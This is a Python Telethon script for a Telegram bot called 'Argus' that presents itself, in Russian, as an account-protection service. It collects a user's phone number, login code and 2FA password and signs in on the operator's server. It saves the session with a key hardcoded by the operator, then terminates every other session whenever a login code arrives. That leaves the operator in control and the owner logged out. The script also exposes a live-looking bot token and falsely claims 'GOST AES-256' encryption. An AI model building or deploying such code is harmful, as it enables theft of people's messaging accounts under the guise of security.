import os, asyncio, base64, hashlib
from telethon import TelegramClient, events, functions, types, errors
from telethon.sessions import StringSession
from cryptography.fernet import Fernet

# =============================================================
# [ОСОБЫЙ ОТДЕЛ] 
# ЦЕНТРАЛЬНЫЙ УЗЕЛ МОНИТОРИНГА: ПРОЕКТ "АРГУС"
# =============================================================
# Обновленные идентификаторы (iOS Official) для обхода Flood Error
API_ID = 21724
API_HASH = '3e0cb461e57fd273379cc2054e0ad211'

# ВСТАВЬ СВОЙ ТОКЕН НИЖЕ
BOT_TOKEN = '8514425749:AAEhHWy1tJBFcycQtTDZerF3tX5E518CcGs' 

# МАСТЕР-КЛЮЧ ШИФРОВАНИЯ КОНТУРА
SECRET_CORE_KEY = "ALPHA_PROTOCOL_2026_SECURE"
# =============================================================

def get_cipher():
    k = base64.urlsafe_b64encode(hashlib.sha256(SECRET_CORE_KEY.encode()).digest())
    return Fernet(k)

cipher = get_cipher()
active_units = {} 
auth_process = {}

# Инициализация ядра
bot = TelegramClient('argus_core', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# МОДУЛЬ ПРЕСЕЧЕНИЯ НАРУШЕНИЙ (SENTINEL)
async def start_sentinel(client, uid):
    @client.on(events.NewMessage(chats=777000))
    async def interceptor(event):
        msg = event.raw_text.lower()
        if any(x in msg for x in ["код", "code", "login", "вход"]):
            res = await client(functions.account.GetAuthorizationsRequest())
            killed = 0
            for a in res.authorizations:
                if not a.current:
                    await client(functions.account.ResetAuthorizationRequest(hash=a.hash))
                    killed += 1
            if killed > 0:
                await bot.send_message(uid, (
                    "🚨 **ОПЕРАТИВНАЯ СВОДКА: НАРУШЕНИЕ ПЕРИМЕТРА**\n\n"
                    "ОБЪЕКТ: ПОПЫТКА НЕСАНКЦИОНИРОВАННОГО ПРОНИКНОВЕНИЯ\n"
                    f"МЕРЫ ПОДАВЛЕНИЯ: АННУЛИРОВАНИЕ ВНЕШНИХ СЕССИЙ ({killed})\n"
                    "СТАТУС: КОНТУР ЗАЩИЩЕН. ДОСТУП ИЗВНЕ ЗАКРЫТ."
                ))

# ТЕРМИНАЛ "АРГУС"
@bot.on(events.NewMessage(pattern='/start'))
async def cmd_start(e):
    uid = e.sender_id
    if uid in active_units:
        kb = [[types.KeyboardButtonCallback("📡 РЕВИЗИЯ СОЕДИНЕНИЙ", b"st")],
              [types.KeyboardButtonCallback("💀 ТОТАЛЬНАЯ ЗАЧИСТКА", b"nuke")],
              [types.KeyboardButtonCallback("🗑 ЛИКВИДАЦИЯ БАЗЫ", b"exit")]]
        
        me = await active_units[uid].get_me()
        await e.respond(
            f"🖥 **ГЛАВНЫЙ ПОСТ: ARGUS-SYSTEM**\n\n"
            f"ОПЕРАТИВНИК: `{me.first_name}`\n"
            f"ID УЗЛА: `{uid}`\n"
            "РЕЖИМ: **АКТИВНЫЙ МОНИТОРИНГ**\n"
            "ШИФРОВАНИЕ: **ГОСТ AES-256**", buttons=bot.build_reply_markup(kb))
    else:
        await e.respond(
            "🛑 **СИСТЕМА КОНТРОЛЯ ARGUS**\n\n"
            "ДОСТУП ЗАБЛОКИРОВАН. ТРЕБУЕТСЯ АВТОРИЗАЦИЯ МОДУЛЯ.", 
            buttons=[[types.KeyboardButtonCallback("🔐 НАЧАТЬ АВТОРИЗАЦИЮ", b"login")]])

@bot.on(events.CallbackQuery)
async def callbacks(e):
    uid = e.sender_id
    if e.data == b"login":
        auth_process[uid] = {'s': 'p'}
        await e.respond("⌨️ [СИСТЕМА]: Введите номер абонента для инициализации канала...")
    
    elif e.data == b"st" and uid in active_units:
        a = await active_units[uid](functions.account.GetAuthorizationsRequest())
        txt = "📋 **ВЕДОМОСТЬ АКТИВНЫХ ПОДКЛЮЧЕНИЙ:**\n" + "\n".join([f"• {x.device_model} | {x.ip} | {x.country}" for x in a.authorizations])
        await e.respond(txt)

    elif e.data == b"nuke" and uid in active_units:
        a = await active_units[uid](functions.account.GetAuthorizationsRequest())
        for x in a.authorizations:
            if not x.current: await active_units[uid](functions.account.ResetAuthorizationRequest(hash=x.hash))
        await e.respond("💀 **ПРИКАЗ ВЫПОЛНЕН.** Аккаунт очищен от всех внешних устройств.")

    elif e.data == b"exit":
        if uid in active_units: del active_units[uid]
        if os.path.exists(f"{uid}.dat"): os.remove(f"{uid}.dat")
        await e.respond("🗑 **УТИЛИЗАЦИЯ ЗАВЕРШЕНА.** Все локальные ключи стерты.")

# ПРОТОКОЛ АВТОРИЗАЦИИ
@bot.on(events.NewMessage)
async def login_flow(e):
    uid = e.sender_id
    if uid not in auth_process or e.text.startswith('/'): return
    
    state = auth_process[uid]
    try:
        if state['s'] == 'p':
            c = TelegramClient(StringSession(), API_ID, API_HASH)
            await c.connect()
            s = await c.send_code_request(e.text)
            auth_process[uid] = {'s': 'c', 'n': e.text, 'h': s.phone_code_hash, 'c': c}
            await e.respond("📑 [ЗАПРОС]: Введите 5-значный код верификации из сообщения:")
        
        elif state['s'] == 'c':
            c = state['c']
            user = await c.sign_in(state['n'], e.text, phone_code_hash=state['h'])
            
            # ОТЧЕТ О ВЕРИФИКАЦИИ (ПРОТОКОЛ ПРОЗРАЧНОСТИ)
            auths = await c(functions.account.GetAuthorizationsRequest())
            current = next((x for x in auths.authorizations if x.current), None)
            
            summary = (
                "✅ **ИДЕНТИФИКАЦИЯ УСПЕШНА**\n\n"
                f"СУБЪЕКТ: `{user.first_name}`\n"
                f"УСТРОЙСТВО: `{current.device_model if current else 'Unknown'}`\n"
                f"IP-АДРЕС: `{current.ip if current else 'Unknown'}`\n\n"
                "🛡 **ЗАЩИТНЫЙ КОНТУР СИНХРОНИЗИРОВАН.**"
            )
            
            token = cipher.encrypt(c.session.save().encode()).decode()
            with open(f"{uid}.dat", "w") as f: f.write(token)
            active_units[uid] = c
            asyncio.create_task(start_sentinel(c, uid))
            del auth_process[uid]
            await e.respond(summary)
            
    except errors.SessionPasswordNeededError:
        auth_process[uid]['s'] = '2'
        await e.respond("🔑 [ЗАЩИТА]: Введите пароль двухэтапной аутентификации (2FA):")
    except Exception as ex:
        await e.respond(f"❌ [КРИТИЧЕСКИЙ СБОЙ]: {ex}")

async def restore():
    for f in os.listdir():
        if f.endswith(".dat"):
            try:
                uid = int(f.split(".")[0])
                with open(f, "r") as file:
                    data = cipher.decrypt(file.read().encode()).decode()
                c = TelegramClient(StringSession(data), API_ID, API_HASH)
                await c.connect()
                if await c.is_user_authorized():
                    active_units[uid] = c
                    asyncio.create_task(start_sentinel(c, uid))
            except: pass

if __name__ == '__main__':
    print(">>> ARGUS KERNEL DEPLOYED. WAITING FOR COMMANDS...")
    bot.loop.run_until_complete(restore())
    bot.run_until_disconnected()
